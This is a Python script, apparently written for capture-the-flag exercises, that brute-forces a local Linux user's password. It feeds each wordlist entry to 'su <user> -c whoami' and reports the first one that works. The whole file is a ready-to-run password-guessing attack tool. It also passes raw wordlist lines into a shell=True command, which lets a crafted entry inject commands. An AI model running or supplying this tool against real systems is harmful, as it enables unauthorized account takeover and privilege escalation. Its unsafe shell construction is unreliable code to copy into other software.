#!usr/bin/env python3

import argparse
import sys
import subprocess
import sys
import signal

#COLORS
RESET = "\033[0m"
BOLD  = "\033[1m"  
GREEN = "\033[38;5;46m"
RED = "\033[38;5;196m"


def print_banner():
    banner = f"""{GREEN}{BOLD}
        ██████╗ ██████╗ ██╗   ██╗████████╗ █████╗ ██╗         ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
        ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔══██╗██║         ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
        ██████╔╝██████╔╝██║   ██║   ██║   ███████║██║         █████╗  ██║   ██║██████╔╝██║      █████╗  
        ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══██║██║         ██╔══╝  ██║   ██║██╔══██╗██║      ██╔══╝  
        ██████╔╝██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗    ██║     ╚██████╔╝██║  ██║╚██████  ███████╗
        ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                        
       {GREEN}{BOLD}   \033[38;5;46mHerramienta diseñada por x0Spectral | v1.0 — Utilizar únicamente en entornos controlados\033[0m\n
{RESET}
"""
    print(banner)

def parse_args():
    parser = argparse.ArgumentParser(description="CTF tool for authorized brute force testing against a Linux user",
                                     prog="brutal-force",
                                     epilog="Diseñada por 0xSpectral | uso exclusivo en CTF",
                                     add_help=True,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-u", "--user", help="usuario objetivo", required=True)
    parser.add_argument("-w","--wordlist", help="diccionario a utilizar", required=True)
    return parser.parse_args()

def exit_failure(string):
        print(f"{RED}{BOLD}[!] {string} is needed exiting in: {RESET}")
        print(f"{RED}{BOLD}[-] Script finished with failure{RESET}")
        sys.exit(1)

def ctrl_c(sig,frame):
    print(f"\n{RED}{BOLD}[!] Script Abortado, salida no exitosa{RESET}")
    sys.exit(1)
    
def executor(cmd):
    if not cmd or cmd == '':
        exit_failure("command")
    result = subprocess.run(cmd,shell=True,text=True, capture_output=True)
    return result.returncode


def progress_bar(current, total, width=40):
    if total <= 0:
        return

    filled = int(width * current / total)
    bar = f"{GREEN}{BOLD}" + ("█" * filled) + "-" * (width - filled)
    
    sys.stdout.write(f"{GREEN}{BOLD}\r[{bar}] {current}/{total}{RESET}")
    sys.stdout.flush()

    if current >= total:
        sys.stdout.write("\n")
    
def brute_forcer(user, wordlist):
    if not user or not wordlist:
        exit_failure("user and wordlist")
    with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
        total = sum(1 for _ in f)
        print(f"{GREEN}{BOLD}\n[+] Vulnerando el login del usuario: {user} ....{RESET}")
        print(f"{GREEN}{BOLD}[+] Realizando el ataque de fuerza bruta utilizando el diccionario: {wordlist} ....{RESET}")
    with open(wordlist, "r", encoding="latin-1") as f:
        for i,line in enumerate(f,start=1):  
            progress_bar(i,total,width=40)
            line = line.strip()
            return_code = executor(f"echo {line} | timeout 0.1 bash -c 'su {user} -c whoami &>/dev/null'")
            if(return_code == 0):
                print(f"{GREEN}{BOLD}\n\n[+] Contraseña encontrada para el usuario {user}: {line}{RESET}")
                sys.exit(0)  
        print(f"{RED}{BOLD}\n[-] No se ha podido encontrar la contraseña para el usuario: {user}{RESET}")
        still_searching(user)
        sys.exit(1)
        
def still_searching(user):
    answer = input(f"{RED}{BOLD}\n[?] Quieres cargar otro diccionario? [S/N]: {RESET}")
    if(answer.lower() == 's'):
        wordlist = input(f"{GREEN}{BOLD}\n[+] De acuerdo, proporciona la ruta de otro diccionario: {RESET}")
        brute_forcer(user, wordlist)
    else:
        sys.exit(0)
            
def main():
    signal.signal(signal.SIGINT, ctrl_c)
    print_banner()
    args = parse_args()
    brute_forcer(args.user, args.wordlist)  

if __name__ == '__main__':
    main()
